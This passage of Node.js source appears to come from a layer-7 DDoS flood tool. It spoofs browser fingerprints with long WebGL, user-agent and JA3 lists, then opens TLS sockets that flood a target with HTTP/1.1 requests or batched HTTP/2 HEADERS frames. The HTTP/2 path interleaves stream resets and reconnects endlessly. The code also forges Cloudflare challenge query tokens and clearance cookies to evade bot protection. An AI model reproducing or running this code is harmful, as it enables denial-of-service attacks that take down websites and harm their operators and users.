        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 SUPER, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1650, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1080 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1080, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1070, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1050, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4090 Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4080 Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070 Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Ti Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Ti Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3050 Ti Laptop GPU, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce MX450, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce MX550, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7900 XTX, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7900 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7800 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7700 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 7600, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6950 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6900 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6800 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6800, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6750 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6700 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6650 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6600 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6600, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 6500 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 5700 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 5700, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 5600 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 5500 XT, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 590, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 580, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 570, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX Vega 64, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX Vega 56, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon(TM) Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon Vega 8 Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon Vega 10 Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon 680M, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon 780M, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Apple Inc.", renderer: "Apple GPU" },
        { vendor: "Apple Inc.", renderer: "Apple M1" },
        { vendor: "Apple Inc.", renderer: "Apple M1 Pro" },
        { vendor: "Apple Inc.", renderer: "Apple M1 Max" },
        { vendor: "Apple Inc.", renderer: "Apple M1 Ultra" },
        { vendor: "Apple Inc.", renderer: "Apple M2" },
        { vendor: "Apple Inc.", renderer: "Apple M2 Pro" },
        { vendor: "Apple Inc.", renderer: "Apple M2 Max" },
        { vendor: "Apple Inc.", renderer: "Apple M2 Ultra" },
        { vendor: "Apple Inc.", renderer: "Apple M3" },
        { vendor: "Apple Inc.", renderer: "Apple M3 Pro" },
        { vendor: "Apple Inc.", renderer: "Apple M3 Max" },
        { vendor: "Apple Inc.", renderer: "Apple M4" },
        { vendor: "Apple Inc.", renderer: "Apple M4 Pro" },
        { vendor: "Apple Inc.", renderer: "Apple M4 Max" },
        { vendor: "Apple Inc.", renderer: "Intel(R) Iris(TM) Plus Graphics 655" },
        { vendor: "Apple Inc.", renderer: "Intel(R) UHD Graphics 630" },
        { vendor: "Apple Inc.", renderer: "AMD Radeon Pro 5500M" },
        { vendor: "Apple Inc.", renderer: "AMD Radeon Pro 5600M" },
        { vendor: "Intel Open Source Technology Center", renderer: "Mesa DRI Intel(R) UHD Graphics 620" },
        { vendor: "Intel Open Source Technology Center", renderer: "Mesa DRI Intel(R) UHD Graphics 630" },
        { vendor: "Intel Open Source Technology Center", renderer: "Mesa DRI Intel(R) Iris(R) Xe Graphics" },
        { vendor: "Intel Open Source Technology Center", renderer: "Mesa DRI Intel(R) HD Graphics 530" },
        { vendor: "Intel", renderer: "Mesa Intel(R) UHD Graphics 770 (ADL-S GT1)" },
        { vendor: "Intel", renderer: "Mesa Intel(R) Arc(TM) A770 Graphics (DG2)" },
        { vendor: "X.Org", renderer: "AMD Radeon RX 6700 XT (RADV NAVI22)" },
        { vendor: "X.Org", renderer: "AMD Radeon RX 6800 XT (RADV NAVI21)" },
        { vendor: "X.Org", renderer: "AMD Radeon RX 7900 XTX (RADV NAVI31)" },
        { vendor: "X.Org", renderer: "AMD Radeon RX 5700 XT (RADV NAVI10)" },
        { vendor: "X.Org", renderer: "AMD Radeon RX 580 Series (RADV POLARIS10)" },
        { vendor: "AMD", renderer: "AMD Radeon RX 6700 XT (RADV NAVI22)" },
        { vendor: "AMD", renderer: "AMD Radeon RX 7900 XT (RADV NAVI31)" },
        { vendor: "nouveau", renderer: "NV137" },
        { vendor: "nouveau", renderer: "NV134" },
        { vendor: "nouveau", renderer: "NV132" },
        { vendor: "nouveau", renderer: "NVE6" },
        { vendor: "NVIDIA Corporation", renderer: "NVIDIA GeForce RTX 3080/PCIe/SSE2" },
        { vendor: "NVIDIA Corporation", renderer: "NVIDIA GeForce RTX 4090/PCIe/SSE2" },
        { vendor: "NVIDIA Corporation", renderer: "NVIDIA GeForce GTX 1080 Ti/PCIe/SSE2" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 740" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 730" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 725" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 710" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 690" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 660" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 650" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 640" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 630" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 620" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 540" },
        { vendor: "Qualcomm", renderer: "Adreno (TM) 530" },
        { vendor: "ARM", renderer: "Mali-G720" },
        { vendor: "ARM", renderer: "Mali-G715" },
        { vendor: "ARM", renderer: "Mali-G710" },
        { vendor: "ARM", renderer: "Mali-G78" },
        { vendor: "ARM", renderer: "Mali-G77" },
        { vendor: "ARM", renderer: "Mali-G76" },
        { vendor: "ARM", renderer: "Mali-G72" },
        { vendor: "ARM", renderer: "Mali-G68" },
        { vendor: "ARM", renderer: "Mali-G57" },
        { vendor: "ARM", renderer: "Mali-G52" },
        { vendor: "ARM", renderer: "Mali-G51" },
        { vendor: "ARM", renderer: "Mali-T880" },
        { vendor: "ARM", renderer: "Mali-T860" },
        { vendor: "Apple Inc.", renderer: "Apple A17 Pro GPU" },
        { vendor: "Apple Inc.", renderer: "Apple A16 GPU" },
        { vendor: "Apple Inc.", renderer: "Apple A15 GPU" },
        { vendor: "Apple Inc.", renderer: "Apple A14 GPU" },
        { vendor: "Apple Inc.", renderer: "Apple A13 GPU" },
        { vendor: "Apple Inc.", renderer: "Apple A12 GPU" },
        { vendor: "Imagination Technologies", renderer: "PowerVR Rogue GE8320" },
        { vendor: "Imagination Technologies", renderer: "PowerVR Rogue GM9446" },
        { vendor: "Google Inc.", renderer: "ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero)), SwiftShader driver)" },
        { vendor: "Google Inc.", renderer: "SwiftShader" },
        { vendor: "Google Inc. (Google)", renderer: "ANGLE (Google, Vulkan 1.1.0 (SwiftShader Device (LLVM 10.0.0)), SwiftShader driver)" },
        { vendor: "Mesa", renderer: "llvmpipe (LLVM 12.0.0, 256 bits)" },
        { vendor: "Mesa", renderer: "softpipe" },
        { vendor: "VMware, Inc.", renderer: "SVGA3D; build: RELEASE; LLVM;" }
    ];

    const tlsVersions = ['771', '772', '773'];
    const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];
    let rdversion = getRandomInt(126, 133);
    const botUserAgents = [
        'TelegramBot (like TwitterBot)',
        'GPTBot/1.0 (+https://openai.com/gptbot)',
        'GPTBot/1.1 (+https://openai.com/gptbot)',
        'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
        'ChatGPT-User/1.0 (+https://openai.com/bot)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Twitterbot/1.0',
        'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
        'Slackbot',
        'Discordbot/2.0 (+https://discordapp.com)',
        'DiscordBot (private use)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
        'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
        'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
        'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)',
        'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)',
        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${rdversion}.0.0.0 Safari/537.36',
        'LinkedInBot/1.0 (+http://www.linkedin.com)',
        'Applebot/0.1 (+http://www.apple.com/go/applebot)',
        'redditbot/1.0 (+https://www.reddit.com/robots.txt)',
        'WhatsApp/2.20.111 A',
        'WhatsApp/2.19.81 A',
        'SkypeUriPreview Preview/0.5',
        'MJ12bot/v1.4.8 (http://mj12bot.com/)',
        'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
        'Exabot/3.0 (+http://www.exabot.com/go/robot)',
        'facebot',
        'ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)',
        'CCBot/2.0 (https://commoncrawl.org/faq/)',
        'ZoominfoBot (zoominfobot at zoominfo dot com)',
        'Google Favicon',
        'Google-InspectionTool',
        'Bytespider (https://byteplus.com)',
        'PetalBot (+https://webmaster.petalsearch.com/site/petalbot)',
        'YouBot/1.0 (+http://www.youbot.com/bot.html)' // Placeholder/Example Bot
    ];

    const ChromeuserAgent = [
      `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36 Edg/${rdversion}.0.0.0`,
      `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
      `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${rdversion}.0) Gecko/20100101 Firefox/${rdversion}.0`,
      `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Edg/${rdversion}.0.0.0`,
      `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(rdversion / 10)}.0 Safari/605.1.15`,
      `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`,
      `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`,
      `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Mobile Safari/537.36`,

    ];

    const userAgent = fakeBot
        ? botUserAgents[Math.floor(Math.random() * botUserAgents.length)]
        : ChromeuserAgent[Math.floor(Math.random() * ChromeuserAgent.length)];

    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed').digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer).digest('hex').substring(0, 8);

    const generateJA3 = () => {
        const version = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
        const cipher = ja3Fingerprint.ciphers.join(':');
        const extension = extensions[Math.floor(Math.random() * extensions.length)];
        const curve = "X25519:P-256:P-384";
        const ja3 = `${version},${cipher},${extension},${curve}`;
        return crypto.createHash('md5').update(ja3).digest('hex');
    };

    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: [2, 4, 6, 8, 12, 16][Math.floor(Math.random() * 6)],
            userAgent: userAgent,
            sextoy: fakeBot ? '"Not A;Brand";v="99", "Chromium";v="130"' : `"Google Chrome";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`,
            deviceMemory: 8,
            maxTouchPoints: 10,
            webdriver: false,
            cookiesEnabled: true
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" } : null,
            Math.random() > 0.3 ? { name: "Widevine Content Decryption Module", filename: "widevinecdm.dll", description: "Enables Widevine licenses for playback of HTML audio/video content" } : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: {
            vendor: selectedWebGL.vendor,
            renderer: selectedWebGL.renderer,
            fingerprint: webglFingerprint
        },
        canvas: canvasFingerprint,
        userActivation: Math.random() > 0.5,
        localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
        ja3: generateJA3(),
        touchSupport: screen.width < 500 ? { maxTouchPoints: getRandomInt(1, 5), touchEvent: true, touchStart: true } : { maxTouchPoints: 0, touchEvent: false, touchStart: false }
    };
}
const fingerprint = generateBrowserFingerprint();
function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);

    return `${coloredStatus}: ${underlinedCount}`;
}

function go() {
    let tlsSocket;

    const netSocket = net.connect({
        host: url.hostname,
        port: 443,
        keepAlive: true,
        keepAliveMsecs: 10000
    }, () => {
        rawConnections++;

        tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: ['h2', 'http/1.1'],
            servername: url.host,
            ciphers: ja3Fingerprint.ciphers.join(':'),
            sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
            secureOptions:
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1 |
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                crypto.constants.SSL_OP_SINGLE_DH_USE |
                crypto.constants.SSL_OP_SINGLE_ECDH_USE,
            secure: true,
            session: crypto.randomBytes(64),
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: ja3Fingerprint.curves.join(':'),
            supportedVersions: ['TLSv1.3', 'TLSv1.2'],
            supportedGroups: ja3Fingerprint.curves.join(':'),
            applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
            rejectUnauthorized: false,
            fingerprint: fingerprint,
            keepAlive: true,
            keepAliveMsecs: 10000
        }, () => {
            if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                if (forceHttp == 2) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                function main() {
                    const method = enableCache ? getRandomMethod() : reqmethod;
                    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                    const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost[](https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
                    tlsSocket.write(h1payl, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                main();
                            }, isFull ? 300 : 300 / ratelimit);
                        } else {
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                main();

                tlsSocket.on('error', () => {
                    tlsSocket.end(() => tlsSocket.destroy());
                });
                return;
            }

            if (forceHttp == 1) {
                tlsSocket.end(() => tlsSocket.destroy());
                return;
            }

            let streamId = 1;
            let data = Buffer.alloc(0);
            let hpack = new HPACK();
            hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

            const updateWindow = Buffer.alloc(4);
            updateWindow.writeUInt32BE(custom_update, 0);
            const frames1 = [];
            const frames = [
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, encodeSettings([
                    [1, http2Fingerprint.HEADER_TABLE_SIZE],
                    [2, http2Fingerprint.ENABLE_PUSH],
                    [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                    [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                    [5, http2Fingerprint.MAX_FRAME_SIZE],
                    [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                    [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                ])),
                encodeFrame(0, 8, updateWindow)
            ];
            frames1.push(...frames);

            tlsSocket.on('data', (eventData) => {
                data = Buffer.concat([data, eventData]);

                while (data.length >= 9) {
                    const frame = decodeFrame(data);
                    if (frame != null) {
                        data = data.subarray(frame.length + 9);
                        if (frame.type == 4 && frame.flags == 0) {
                            tlsSocket.write(encodeFrame(0, 4, "", 1));
                        }
                        if (frame.type == 1) {
                            const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                            if (status == 403 || status == 400) {
                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                                netSocket.end(() => netSocket.destroy());
                            }
                            if (!statuses[status])
                                statuses[status] = 0;

                            statuses[status]++;
                        }

                        if (frame.type == 7 || frame.type == 5) {
                            if (frame.type == 7) {
                                if (debugMode) {
                                    if (!statuses['GOAWAY'])
                                        statuses['GOAWAY'] = 0;

                                    statuses['GOAWAY']++;
                                }
                            }

                            tlsSocket.write(encodeRstStream(0));
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    } else {
                        break;
                    }
                }
            });

            tlsSocket.write(Buffer.concat(frames1));

            function main() {
                if (tlsSocket.destroyed) {
                    return;
                }
                const requests = [];
                let localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : process.argv[6];
                const startTime = Date.now();
                const customHeadersArray = [];
                if (customHeaders) {
                    customHeaders.split('#').forEach(header => {
                        const [name, value] = header.split(':').map(part => part?.trim());
                        if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                    });
                }

                for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
                    let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
                    const method = enableCache ? getRandomMethod() : reqmethod;
                    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                    const pseudoHeaders = [
                        [":method", method],
                        [":authority", url.hostname],
                        [":scheme", "https"],
                        [":path", path],
                    ];

                    const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
                    const additionalRegularHeaders = Object.entries({
                        ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
                        ...(Math.random() > 0.4 && { "dnt": "1" }),
                        ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                        ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                    }).filter(a => a[1] != null);

                    const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
                    shuffle(allRegularHeaders);

                    const combinedHeaders = [
                        ...pseudoHeaders,
                        ...allRegularHeaders,
                        ['cookie', generateCfClearanceCookie()],
                        ...generateChallengeHeaders(),
                        ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
                    ];

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(combinedHeaders)
                    ]);
                    const flags = 0x1 | 0x4 | 0x8 | 0x20;
                    const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                    const frame = Buffer.concat([encodedFrame]);
                    if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                        const rstStreamFrame = encodeRstStream(streamId, 8);
                        tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                        STREAMID_RESET = 0;
                    }

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 4;
                }

                tlsSocket.write(Buffer.concat(requests), (err) => {
                    if (err) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }
                    const elapsed = Date.now() - startTime;
                    const delay = Math.max(50, (150 / localRatelimit) - elapsed);
                    setTimeout(() => main(), delay);
                });
            }
            main();
        }).on('error', () => {
            tlsSocket.destroy();
        });

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });

    netSocket.on('close', () => {
        cleanup();
    });

    function cleanup(error) {
        if (error) {
            setTimeout(go, getRandomInt(50, 200));
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}

function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
